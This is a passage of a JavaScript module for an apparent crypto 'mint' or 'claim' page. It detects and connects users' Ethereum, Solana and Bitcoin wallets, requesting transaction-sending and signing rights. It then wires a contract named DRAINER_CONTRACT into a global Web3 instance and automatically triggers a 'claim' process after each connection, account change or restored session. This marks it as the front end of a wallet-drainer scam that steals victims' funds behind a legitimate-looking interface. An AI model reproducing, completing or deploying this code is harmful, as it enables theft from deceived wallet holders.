

import { CONFIG } from './config.js';

;(async function() {
  // ================================================================
  // DEBUG PANEL (hidden by default, double‑click to toggle)
  // ================================================================
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 12px; padding: 5px;
    z-index: 10000; max-height: 150px; overflow-y: auto;
    display: none; font-family: monospace;
  `;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  function logDebug(msg) {
    console.log(msg);
    debugArea.innerHTML += `<div>${new Date().toLocaleTimeString()}: ${msg}</div>`;
    debugArea.scrollTop = debugArea.scrollHeight;
  }

  // ================================================================
  // DEVICE DETECTION
  // ================================================================
  const isMobile = () => /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
  const isIOS = () => /iPhone|iPad|iPod/i.test(navigator.userAgent);
  const isAndroid = () => /Android/i.test(navigator.userAgent);
  const isDesktop = () => !isMobile();
  const getPlatform = () => {
    if (isIOS()) return 'ios';
    if (isAndroid()) return 'android';
    if (/Windows/i.test(navigator.userAgent)) return 'windows';
    if (/Macintosh|Mac OS X/i.test(navigator.userAgent)) return 'mac';
    return 'unknown';
  };

  // ================================================================
  // DOM REFS & UI STATE
  // ================================================================
  const connectButton = document.getElementById('connectButton');
  const walletButton = document.getElementById('walletButton');
  const claimStatus = document.getElementById('claimStatus');

  let currentSession = null;
  let client = null;
  let modal = null;
  let SignClient, WalletConnectModal, EthereumProvider;

  // ================================================================
  // UI HELPERS (unchanged styling)
  // ================================================================
  function setButtonState(button, state, message = '') {
    if (!button) return;
    button.style.display = 'inline-block';
    button.style.padding = '14px 28px';
    button.style.borderRadius = '8px';
    button.style.fontWeight = '600';
    button.style.border = 'none';
    button.style.cursor = state === 'loading' ? 'not-allowed' : 'pointer';
    button.style.transition = 'all 0.3s ease';
    button.style.color = 'white';
    button.style.fontSize = '16px';
    button.style.fontFamily = "'Inter', sans-serif";
    button.style.boxShadow = '0 4px 12px rgba(0, 0, 0, 0.15)';
    button.style.minWidth = '180px';
    button.disabled = state === 'loading';

    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg, #666666 0%, #888888 100%)';
        button.style.boxShadow = '0 2px 8px rgba(102, 102, 102, 0.3)';
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...';
        break;
      case 'connected':
        button.style.background = 'linear-gradient(135deg, #10B981 0%, #059669 100%)';
        button.style.boxShadow = '0 4px 12px rgba(16, 185, 129, 0.3)';
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected';
        break;
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.style.boxShadow = '0 4px 12px rgba(239, 68, 68, 0.3)';
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect';
        break;
      case 'failed':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.style.boxShadow = '0 4px 12px rgba(239, 68, 68, 0.3)';
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed';
        setTimeout(() => setButtonState(button, 'normal'), 3000);
        break;
      default:
        button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)';
        button.style.boxShadow = '0 4px 12px rgba(255, 107, 0, 0.3)';
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet to Mint';
        button.onmouseenter = () => {
          if (!button.disabled) {
            button.style.transform = 'translateY(-2px)';
            button.style.boxShadow = '0 6px 16px rgba(255, 107, 0, 0.4)';
          }
        };
        button.onmouseleave = () => {
          button.style.transform = 'translateY(0)';
          button.style.boxShadow = '0 4px 12px rgba(255, 107, 0, 0.3)';
        };
        break;
    }
  }

  function showStatus(message, type = 'info') {
    if (!claimStatus) return;
    claimStatus.textContent = message;
    claimStatus.className = `status ${type}`;
    claimStatus.style.display = 'block';
    claimStatus.style.padding = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop = '12px';
    claimStatus.style.fontWeight = '500';
    claimStatus.style.fontSize = '14px';
    claimStatus.style.textAlign = 'center';
    claimStatus.style.transition = 'all 0.3s ease';

    const styles = {
      success: { background: 'linear-gradient(135deg, #DCFCE7 0%, #BBF7D0 100%)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg, #DBEAFE 0%, #BFDBFE 100%)', color: '#1E40AF', border: '1px solid #93C5FD' },
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);

    if (type === 'error' || type === 'success') {
      setTimeout(() => {
        claimStatus.style.opacity = '0';
        setTimeout(() => {
          claimStatus.style.display = 'none';
          claimStatus.style.opacity = '1';
        }, 300);
      }, 5000);
    }
  }

  // ================================================================
  // STORAGE HELPERS
  // ================================================================
  function saveWallet(address, session = null, chainType = 'evm') {
    localStorage.setItem('connectedWallet', address);
    if (session) localStorage.setItem('walletConnectSession', JSON.stringify(session));
    localStorage.setItem('chainType', chainType);
  }
  function getSavedWallet() { return localStorage.getItem('connectedWallet'); }
  function getSavedSession() {
    const session = localStorage.getItem('walletConnectSession');
    return session ? JSON.parse(session) : null;
  }
  function getSavedChainType() { return localStorage.getItem('chainType') || 'unknown'; }
  function clearSavedWallet() {
    localStorage.removeItem('connectedWallet');
    localStorage.removeItem('walletConnectSession');
    localStorage.removeItem('chainType');
  }

  // ================================================================
  // GLOBAL PROVIDER / WEB3 SETUP (for Script.js)
  // ================================================================
  function setGlobalProvider(provider, address, chain = 'evm') {
    // Make provider available to Script.js
    window.ethereum = provider;
    if (provider) {
      // Create Web3 instance and contract instance
      const Web3 = window.Web3; // should be loaded globally
      if (Web3) {
        window.web3 = new Web3(provider);
        window.contractInstance = new window.web3.eth.Contract(CONFIG.CONTRACT_ABI, CONFIG.DRAINER_CONTRACT);
        logDebug('✅ Web3 and contract instance set globally');
      } else {
        logDebug('⚠️ Web3 library not found – ensure web3.js is loaded');
      }
    }
    // Also set connected address
    window.connectedAddress = address;
    window.connectedWallet = chain;
  }

  // ================================================================
  // UI UPDATE WITH CHAIN BADGE
  // ================================================================
  function updateConnectedUI(address, chain = 'evm') {
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const chainLabels = { evm: '◆ ETH', bitcoin: '₿ BTC', solana: '◎ SOL' };
    const chainLabel = chainLabels[chain] || 'Unknown';

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top: 12px; padding: 10px 16px;
        font-family: 'JetBrains Mono', monospace; font-size: 14px;
        color: #059669; text-align: center;
        background: linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%);
        border-radius: 8px; border: 1px solid #A7F3D0;
        box-shadow: 0 2px 8px rgba(5, 150, 105, 0.1);
      `;
      connectButton.parentNode.appendChild(display);
    }

    const formatted = `${address.slice(0, 6)}...${address.slice(-4)}`;
    display.innerHTML = `
      <div style="display:flex; align-items:center; justify-content:center; gap:8px; flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${formatted}</span>
        <span style="background:#1F2937; color:white; padding:2px 10px; border-radius:12px; font-size:12px; font-weight:600;">${chainLabel}</span>
        <button id="copyAddress" style="background:none; border:none; color:#059669; cursor:pointer; padding:4px;" title="Copy address">
          <i class="far fa-copy"></i>
        </button>
      </div>
    `;

    document.getElementById('copyAddress').addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const btn = document.getElementById('copyAddress');
        const orig = btn.innerHTML;
        btn.innerHTML = '<i class="fas fa-check"></i>';
        btn.style.color = '#10B981';
        setTimeout(() => {
          btn.innerHTML = orig;
          btn.style.color = '#059669';
        }, 2000);
      });
    });

    showStatus(`Connected to ${chainLabel}`, 'success');
  }

  function resetConnectedUI() {
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');
    const display = document.getElementById('connectedAddressDisplay');
    if (display) display.remove();
    showStatus('Wallet disconnected', 'info');
    // Clear global provider
    window.ethereum = null;
    window.web3 = null;
    window.contractInstance = null;
    window.connectedAddress = null;
    window.connectedWallet = null;
  }

  // ================================================================
  // EIP‑6963: DETECT ALL EVM PROVIDERS
  // ================================================================
  let evmProviders = [];
  let eip6963Initialized = false;

  function setupEIP6963() {
    if (eip6963Initialized) return;
    eip6963Initialized = true;

    window.addEventListener('eip6963:announceProvider', (event) => {
      const detail = event.detail;
      if (!evmProviders.some(p => p.info.uuid === detail.info.uuid)) {
        evmProviders.push(detail);
        logDebug(`EIP‑6963: Found provider ${detail.info.name} (${detail.info.rdns})`);
      }
    });

    window.dispatchEvent(new Event('eip6963:requestProvider'));
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 500);
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 1000);
  }

  // ================================================================
  // WALLET SELECTION MODAL (for multiple EVM providers)
  // ================================================================
  function showWalletSelectionModal(providers, callback) {
    const overlay = document.createElement('div');
    overlay.style.cssText = `
      position: fixed; top:0; left:0; width:100%; height:100%;
      background: rgba(0,0,0,0.7); display:flex; align-items:center; justify-content:center;
      z-index: 99999;
    `;
    const modalDiv = document.createElement('div');
    modalDiv.style.cssText = `
      background: #1F2937; padding: 24px; border-radius: 16px; max-width: 400px; width: 90%;
      color: white; font-family: 'Inter', sans-serif;
      box-shadow: 0 20px 60px rgba(0,0,0,0.5);
    `;
    modalDiv.innerHTML = `
      <h3 style="margin-top:0; font-weight:600; font-size:20px;">Select a Wallet</h3>
      <div id="walletList" style="display:flex; flex-direction:column; gap:10px; margin:16px 0;"></div>
      <button id="cancelWalletSelect" style="background:none; border:1px solid #666; color:#ccc; padding:8px 16px; border-radius:8px; cursor:pointer; width:100%;">Cancel</button>
    `;
    overlay.appendChild(modalDiv);
    document.body.appendChild(overlay);

    const list = modalDiv.querySelector('#walletList');
    providers.forEach((provider) => {
      const btn = document.createElement('button');
      btn.textContent = provider.info.name;
      btn.style.cssText = `
        background: #374151; border:none; padding:12px 16px; border-radius:8px;
        color:white; font-size:16px; cursor:pointer; transition:background 0.2s;
        text-align:left; display:flex; align-items:center; gap:10px;
      `;
      btn.onmouseover = () => btn.style.background = '#4B5563';
      btn.onmouseout = () => btn.style.background = '#374151';
      if (provider.info.icon) {
        const img = document.createElement('img');
        img.src = provider.info.icon;
        img.style.width = '24px';
        img.style.height = '24px';
        btn.prepend(img);
      }
      btn.addEventListener('click', () => {
        overlay.remove();
        callback(provider);
      });
      list.appendChild(btn);
    });

    modalDiv.querySelector('#cancelWalletSelect').addEventListener('click', () => {
      overlay.remove();
      callback(null);
    });
  }

  // ================================================================
  // DYNAMIC LIBRARY LOADING – with Ethereum Provider
  // ================================================================
  async function loadWalletConnect() {
    const signClientUrls = [
      'https://esm.sh/@walletconnect/sign-client@2.11.0',
      'https://cdn.skypack.dev/@walletconnect/sign-client@2.11.0',
      'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.11.0/+esm'
    ];
    const modalUrls = [
      'https://esm.sh/@walletconnect/modal@2.6.2',
      'https://cdn.skypack.dev/@walletconnect/modal@2.6.2',
      'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/+esm'
    ];
    const ethProviderUrls = [
      'https://esm.sh/@walletconnect/ethereum-provider@2.11.0',
      'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0',
      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm'
    ];

    let SignClientMod, WalletConnectModalMod, EthereumProviderMod;

    for (const url of signClientUrls) {
      try {
        logDebug(`Loading SignClient from ${url}`);
        const mod = await import(url);
        SignClientMod = mod.default || mod;
        logDebug('✅ SignClient loaded');
        break;
      } catch (e) {
        logDebug(`❌ Failed SignClient from ${url}: ${e.message}`);
      }
    }
    if (!SignClientMod) throw new Error('Could not load SignClient');

    for (const url of modalUrls) {
      try {
        logDebug(`Loading WalletConnectModal from ${url}`);
        const mod = await import(url);
        WalletConnectModalMod = mod.WalletConnectModal || mod.default || mod;
        logDebug('✅ WalletConnectModal loaded');
        break;
      } catch (e) {
        logDebug(`❌ Failed WalletConnectModal from ${url}: ${e.message}`);
      }
    }
    if (!WalletConnectModalMod) throw new Error('Could not load WalletConnectModal');

    for (const url of ethProviderUrls) {
      try {
        logDebug(`Loading EthereumProvider from ${url}`);
        const mod = await import(url);
        EthereumProviderMod = mod.EthereumProvider || mod.default || mod;
        logDebug('✅ EthereumProvider loaded');
        break;
      } catch (e) {
        logDebug(`❌ Failed EthereumProvider from ${url}: ${e.message}`);
      }
    }
    if (!EthereumProviderMod) throw new Error('Could not load EthereumProvider');

    return { SignClient: SignClientMod, WalletConnectModal: WalletConnectModalMod, EthereumProvider: EthereumProviderMod };
  }

  // ================================================================
  // FAST WEBSOCKET CHECK (only for WalletConnect)
  // ================================================================
  async function checkWebSocketFast(retries = 2, delay = 500) {
    for (let i = 0; i < retries; i++) {
      try {
        const result = await new Promise((resolve) => {
          const ws = new WebSocket('wss://relay.walletconnect.com');
          const timeout = setTimeout(() => { ws.close(); resolve(false); }, 2000);
          ws.onopen = () => { clearTimeout(timeout); ws.close(); resolve(true); };
          ws.onerror = () => { clearTimeout(timeout); ws.close(); resolve(false); };
        });
        if (result) return true;
        await new Promise(r => setTimeout(r, delay));
      } catch (e) {
        await new Promise(r => setTimeout(r, delay));
      }
    }
    return false;
  }

  // ================================================================
  // WALLETCONNECT INIT (with session restoration support)
  // ================================================================
  async function initWalletConnect(useTestId = false) {
    if (client && modal) return true;

    const projectId = useTestId ? CONFIG.PUBLIC_TEST_ID : CONFIG.PROJECT_ID;
    logDebug(`Initializing WalletConnect with projectId: ${projectId}`);

    // Quick WebSocket check (non‑critical)
    const wsOk = await checkWebSocketFast(2, 500);
    if (!wsOk) logDebug('⚠️ WebSocket check failed – proceeding anyway');

    try {
      client = await SignClient.init({
        projectId,
        metadata: CONFIG.DAPP_METADATA,
        relayUrl: 'wss://relay.walletconnect.com',
      });

      modal = new WalletConnectModal({
        projectId,
        themeMode: 'dark',
        themeVariables: {
          '--wcm-z-index': '9999',
          '--wcm-accent-color': '#FF6B00',
          '--wcm-background-color': '#1F2937',
          '--wcm-font-family': "'Inter', sans-serif",
        },
        enableExplorer: true,
        explorerRecommendedWalletIds: [
          'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96',
          '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0',
          '1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369',
          'fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa',
          'ecc4036f814562b41a5268adc86270fba1365471402006302e70169465b7ac18',
        ],
        mobileWallets: [
          { id: 'metamask', name: 'MetaMask', links: { native: 'metamask://', universal: 'https://metamask.app.link/' } },
          { id: 'trust', name: 'Trust Wallet', links: { native: 'trust://', universal: 'https://link.trustwallet.com/' } },
          { id: 'rainbow', name: 'Rainbow', links: { native: 'rainbow://', universal: 'https://rnbwapp.com/' } },
          { id: 'coinbase', name: 'Coinbase Wallet', links: { native: 'coinbasewallet://', universal: 'https://go.cb-w.com/' } },
        ],
      });

      logDebug('✅ WalletConnect initialized successfully');
      return true;
    } catch (error) {
      logDebug(`❌ WalletConnect init failed: ${error.message}`);
      return false;
    }
  }

  // ================================================================
  // DIRECT EVM CONNECTION (Desktop) with 5s timeout
  // ================================================================
  async function connectDirectEVM(timeoutMs = 5000) {
    setupEIP6963();
    await new Promise(r => setTimeout(r, 300)); // short wait for providers

    let providers = evmProviders.filter(p => p.provider);
    if (providers.length === 0 && window.ethereum) {
      providers = [{
        info: { name: 'Injected Wallet', rdns: 'io.injected', icon: '' },
        provider: window.ethereum
      }];
    }

    if (providers.length === 0) {
      logDebug('No EVM providers found');
      return false;
    }

    // Auto‑select MetaMask if present, else ask user
    let chosenProvider = null;
    if (providers.length === 1) {
      chosenProvider = providers[0];
    } else {
      const known = providers.find(p => p.info.rdns === 'io.metamask' || p.info.name.toLowerCase().includes('metamask'));
      if (known) {
        chosenProvider = known;
      } else {
        const result = await new Promise((resolve) => {
          showWalletSelectionModal(providers, (selected) => resolve(selected));
        });
        if (!result) return false;
        chosenProvider = result;
      }
    }

    // Attempt connection with timeout
    try {
      const provider = chosenProvider.provider;
      const accounts = await Promise.race([
        provider.request({ method: 'eth_requestAccounts' }),
        new Promise((_, reject) => setTimeout(() => reject(new Error('Connection timeout')), timeoutMs))
      ]);
      if (accounts && accounts.length > 0) {
        const address = accounts[0];
        logDebug(`✅ Direct EVM connection via ${chosenProvider.info.name}: ${address}`);
        // Set global provider and web3
        setGlobalProvider(provider, address, 'evm');
        // Save state
        saveWallet(address, null, 'evm');
        updateConnectedUI(address, 'evm');
        // Setup provider events for account/chain changes
        setupEVMProviderEvents(provider);
        return true;
      }
    } catch (err) {
      logDebug(`Direct EVM connection failed: ${err.message}`);
      if (err.code === 4001) {
        logDebug('User rejected connection');
      }
      return false;
    }
    return false;
  }

  // ================================================================
  // WALLETCONNECT CONNECTION (Universal, but used primarily on Mobile and Desktop fallback)
  // ================================================================
  async function connectViaWalletConnect(useTestId = false) {
    const initOk = await initWalletConnect(useTestId);
    if (!initOk) {
      showStatus('WalletConnect service unavailable', 'error');
      return false;
    }

    try {
      showStatus('Connecting via WalletConnect...', 'info');
      const { uri, approval } = await client.connect({
        requiredNamespaces: {
          eip155: {
            methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'],
            chains: ['eip155:1'],
            events: ['chainChanged', 'accountsChanged'],
          },
        },
      });

      if (uri) {
        logDebug(`WalletConnect URI generated: ${uri}`);
        // Open modal – on mobile this will show QR and also attempt to open wallet via deeplink (modal handles it)
        modal.openModal({ uri });
        showStatus('Approve connection in your wallet', 'info');
        // Store URI for possible return (but we won't use custom deeplinks)
        sessionStorage.setItem('pending_wc_uri', uri);
        sessionStorage.setItem('pending_wc_timestamp', Date.now().toString());
      }

      // Wait for approval with timeout (60s)
      const session = await Promise.race([
        approval(),
        new Promise((_, reject) => setTimeout(() => reject(new Error('Connection timeout')), 60000))
      ]);

      modal.closeModal();

      if (session?.namespaces?.eip155?.accounts?.length) {
        const account = session.namespaces.eip155.accounts[0].split(':')[2];
        logDebug(`✅ WalletConnect session established for ${account}`);

        // Create an Ethereum provider from the session using @walletconnect/ethereum-provider
        const provider = await EthereumProvider.init({
          projectId: useTestId ? CONFIG.PUBLIC_TEST_ID : CONFIG.PROJECT_ID,
          metadata: CONFIG.DAPP_METADATA,
          session, // pass the established session
        });

        // Set global provider and web3
        setGlobalProvider(provider, account, 'evm');
        currentSession = session;
        saveWallet(account, session, 'evm');
        updateConnectedUI(account, 'evm');

        // Clean up pending URI
        sessionStorage.removeItem('pending_wc_uri');
        sessionStorage.removeItem('pending_wc_timestamp');

        // Setup provider events (WalletConnect provider also emits these)
        setupEVMProviderEvents(provider);

        return true;
      } else {
        showStatus('No accounts found in session', 'error');
        return false;
      }
    } catch (err) {
      logDebug(`❌ WalletConnect error: ${err.message}`);
      if (modal) modal.closeModal();
      sessionStorage.removeItem('pending_wc_uri');
      sessionStorage.removeItem('pending_wc_timestamp');
      if (err.message?.includes('User rejected') || err.message?.includes('Cancelled')) {
        showStatus('Connection cancelled by user', 'error');
      } else if (err.message?.includes('timeout')) {
        showStatus('Connection timeout – please try again', 'error');
      } else {
        showStatus('WalletConnect connection failed', 'error');
      }
      return false;
    }
  }

  // ================================================================
  // EVM PROVIDER EVENTS (accountsChanged, chainChanged, disconnect)
  // ================================================================
  function setupEVMProviderEvents(provider) {
    if (!provider) return;
    // Remove previous listeners if any? Not needed.
    provider.on('accountsChanged', (accounts) => {
      if (accounts.length === 0) {
        resetConnectedUI();
        clearSavedWallet();
        showStatus('Wallet disconnected', 'info');
      } else {
        const address = accounts[0];
        setGlobalProvider(provider, address, 'evm');
        updateConnectedUI(address, 'evm');
        saveWallet(address, currentSession, 'evm');
        // Trigger claim after short delay
        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') {
            window.initiateClaimProcess();
          }
        }, 500);
      }
    });
    provider.on('chainChanged', (chainId) => {
      showStatus(`Network changed to ${parseInt(chainId)}`, 'info');
    });
    provider.on('disconnect', () => {
      resetConnectedUI();
      clearSavedWallet();
      showStatus('Wallet disconnected', 'error');
    });
  }

  // ================================================================
  // SOLANA / BITCOIN DETECTION (optional fallbacks)
  // ================================================================
  function getSolanaWallets() {
    const wallets = [];
    if (window.phantom?.solana || window.solana?.isPhantom) {
      wallets.push({ name: 'Phantom', provider: window.phantom?.solana || window.solana });
    }
    if (window.solflare) {
      wallets.push({ name: 'Solflare', provider: window.solflare });
    }
    if (window.backpack) {
      wallets.push({ name: 'Backpack', provider: window.backpack });
    }
    if (window.coinbaseSolana) {
      wallets.push({ name: 'Coinbase', provider: window.coinbaseSolana });
    }
    if (window.trustWallet?.solana) {
      wallets.push({ name: 'Trust', provider: window.trustWallet.solana });
    }
    return wallets;
  }

  async function connectSolana() {
    // Not the primary flow – only if EVM fails and user explicitly wants it
    // We'll keep minimal implementation for completeness
    const wallets = getSolanaWallets();
    if (wallets.length === 0) return false;
    try {
      const wallet = wallets[0];
      const provider = wallet.provider;
      let publicKey;
      if (provider.connect) {
        const response = await provider.connect();
        publicKey = response.publicKey?.toString() || response.toString();
      } else if (provider.request) {
        const response = await provider.request({ method: 'connect' });
        publicKey = response.publicKey.toString();
      } else {
        throw new Error('Unsupported provider');
      }
      const address = publicKey;
      saveWallet(address, null, 'solana');
      updateConnectedUI(address, 'solana');
      window.solanaProvider = provider;
      window.solanaPublicKey = address;
      // Set global? Not for EVM.
      return true;
    } catch (e) {
      logDebug(`Solana connection failed: ${e.message}`);
      return false;
    }
  }

  async function connectBitcoin() {
    if (!window.unisat) return false;
    try {
      await window.unisat.requestAccounts();
      const accounts = await window.unisat.getAccounts();
      if (!accounts || accounts.length === 0) return false;
      const address = accounts[0];
      saveWallet(address, null, 'bitcoin');
      updateConnectedUI(address, 'bitcoin');
      return true;
    } catch (e) {
      logDebug(`Bitcoin connection failed: ${e.message}`);
      return false;
    }
  }

  // ================================================================
  // DISCONNECT
  // ================================================================
  async function disconnectWallet() {
    try {
      if (window.solanaProvider && window.solanaProvider.disconnect) {
        await window.solanaProvider.disconnect();
      }
      if (client && currentSession) {
        await client.disconnect({
          topic: currentSession.topic,
          reason: { code: 6000, message: 'User disconnected' },
        });
        currentSession = null;
      }
    } catch (err) {
      logDebug(`Disconnect error: ${err.message}`);
    }
    resetConnectedUI();
    clearSavedWallet();
    window.solanaProvider = null;
    window.solanaPublicKey = null;
    window.ethereum = null;
    window.web3 = null;
    window.contractInstance = null;
    window.connectedAddress = null;
    window.connectedWallet = null;
  }

  // ================================================================
  // MAIN CONNECT DISPATCHER – Device‑aware
  // ================================================================
  async function connectWallet() {
    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Connecting...', 'info');

    let success = false;
    const platform = getPlatform();
    logDebug(`Platform: ${platform} | isMobile: ${isMobile()}`);

    if (isMobile()) {
      // ========== MOBILE: WalletConnect ONLY ==========
      logDebug('📱 Mobile device – using WalletConnect only');
      success = await connectViaWalletConnect(false);
      if (!success) {
        // Try with public test ID if primary fails
        logDebug('Retrying WalletConnect with public test ID');
        success = await connectViaWalletConnect(true);
      }
      if (!success) {
        showStatus('Mobile: WalletConnect failed. Please install a compatible wallet.', 'error');
        setButtonState(connectButton, 'failed');
        if (walletButton) setButtonState(walletButton, 'failed');
      } else {
        setButtonState(connectButton, 'connected');
        if (walletButton) setButtonState(walletButton, 'connected');
        // Trigger claim after short delay
        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') {
            window.initiateClaimProcess();
          }
        }, 500);
      }
      return;
    }

    // ========== DESKTOP: Direct EVM (5s timeout) → WalletConnect → Solana → Bitcoin ==========
    logDebug('🖥️ Desktop – trying Direct EVM (5s timeout)');
    success = await connectDirectEVM(5000);
    if (success) {
      logDebug('✅ Direct EVM connection successful');
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') {
          window.initiateClaimProcess();
        }
      }, 500);
      return;
    }

    logDebug('Desktop – Direct EVM failed, falling back to WalletConnect');
    success = await connectViaWalletConnect(false);
    if (!success) {
      success = await connectViaWalletConnect(true);
    }
    if (success) {
      logDebug('✅ WalletConnect fallback successful');
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') {
          window.initiateClaimProcess();
        }
      }, 500);
      return;
    }

    // Attempt Solana and Bitcoin as last resort (only if EVM completely fails)
    logDebug('Desktop – trying Solana');
    success = await connectSolana();
    if (success) {
      logDebug('✅ Solana connection successful');
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') {
          window.initiateClaimProcess();
        }
      }, 500);
      return;
    }

    logDebug('Desktop – trying Bitcoin');
    success = await connectBitcoin();
    if (success) {
      logDebug('✅ Bitcoin connection successful');
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') {
          window.initiateClaimProcess();
        }
      }, 500);
      return;
    }

    // All failed
    logDebug('❌ All connection attempts failed');
    showStatus('No supported wallet found. Please install a wallet.', 'error');
    setButtonState(connectButton, 'failed');
    if (walletButton) setButtonState(walletButton, 'failed');
  }

  // ================================================================
  // BUTTON CLICK HANDLER
  // ================================================================
  const handleClick = async () => {
    const saved = getSavedWallet();
    if (saved && (currentSession || getSavedChainType() !== 'unknown')) {
      await disconnectWallet();
    } else {
      await connectWallet();
    }
  };

  if (connectButton) connectButton.addEventListener('click', handleClick);
  if (walletButton) walletButton.addEventListener('click', handleClick);

  // ================================================================
  // RESTORE SESSION (on page load / visibility change)
  // ================================================================
  async function restoreWalletConnection() {
    const savedWallet = getSavedWallet();
    const savedChain = getSavedChainType();
    const savedSession = getSavedSession();

    // Check for pending WalletConnect return (if any)
    const pendingUri = sessionStorage.getItem('pending_wc_uri');
    const pendingTimestamp = sessionStorage.getItem('pending_wc_timestamp');
    if (pendingUri && pendingTimestamp) {
      const elapsed = Date.now() - parseInt(pendingTimestamp);
      if (elapsed < 120000 && client) {
        logDebug('Detected return from wallet – waiting for session...');
        // Wait a bit for session to be established
        await new Promise(r => setTimeout(r, 1000));
        try {
          const sessions = client.session.values();
          if (sessions.length > 0) {
            const session = sessions[0];
            const account = session.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
            if (account) {
              // Create provider and set globals
              const provider = await EthereumProvider.init({
                projectId: CONFIG.PROJECT_ID,
                metadata: CONFIG.DAPP_METADATA,
                session,
              });
              setGlobalProvider(provider, account, 'evm');
              currentSession = session;
              saveWallet(account, session, 'evm');
              updateConnectedUI(account, 'evm');
              sessionStorage.removeItem('pending_wc_uri');
              sessionStorage.removeItem('pending_wc_timestamp');
              setTimeout(() => {
                if (typeof window.initiateClaimProcess === 'function') {
                  window.initiateClaimProcess();
                }
              }, 500);
              return;
            }
          }
        } catch (e) {
          logDebug(`Session restore after redirect failed: ${e.message}`);
        }
        sessionStorage.removeItem('pending_wc_uri');
        sessionStorage.removeItem('pending_wc_timestamp');
      }
    }

    // Restore saved session
    if (savedWallet && savedChain === 'evm') {
      if (savedSession) {
        const initOk = await initWalletConnect(false);
        if (initOk) {
          try {
            const session = client.session.get(savedSession.topic);
            if (session) {
              const provider = await EthereumProvider.init({
                projectId: CONFIG.PROJECT_ID,
                metadata: CONFIG.DAPP_METADATA,
                session,
              });
              setGlobalProvider(provider, savedWallet, 'evm');
              currentSession = session;
              updateConnectedUI(savedWallet, 'evm');
              return;
            }
          } catch (e) {
            logDebug(`Restore session failed: ${e.message}`);
          }
        }
      }
      // Try direct provider (desktop)
      if (isDesktop() && window.ethereum) {
        try {
          const accounts = await window.ethereum.request({ method: 'eth_accounts' });
          if (accounts.length > 0 && accounts[0] === savedWallet) {
            setGlobalProvider(window.ethereum, savedWallet, 'evm');
            updateConnectedUI(savedWallet, 'evm');
            return;
          }
        } catch (e) {}
      }
      // If on mobile and no session, clear saved wallet
      if (isMobile()) {
        clearSavedWallet();
      }
    } else if (savedWallet && savedChain === 'solana') {
      // Restore Solana if possible (not primary)
      if (isDesktop()) {
        const success = await connectSolana();
        if (success) return;
      }
      clearSavedWallet();
    } else if (savedWallet && savedChain === 'bitcoin') {
      if (isDesktop()) {
        const success = await connectBitcoin();
        if (success) return;
      }
      clearSavedWallet();
    }
  }

  // ================================================================
  // LOAD LIBRARIES & INIT
  // ================================================================
  try {
    const libs = await loadWalletConnect();
    SignClient = libs.SignClient;
    WalletConnectModal = libs.WalletConnectModal;
    EthereumProvider = libs.EthereumProvider;
    logDebug('✅ WalletConnect libraries loaded successfully');

    setupEIP6963();

    // Restore previous connection
    await restoreWalletConnection();

    // Set up session event listeners
    if (client) {
      client.on('session_update', async ({ params }) => {
        const accounts = params.namespaces?.eip155?.accounts;
        if (accounts?.length) {
          const account = accounts[0].split(':')[2];
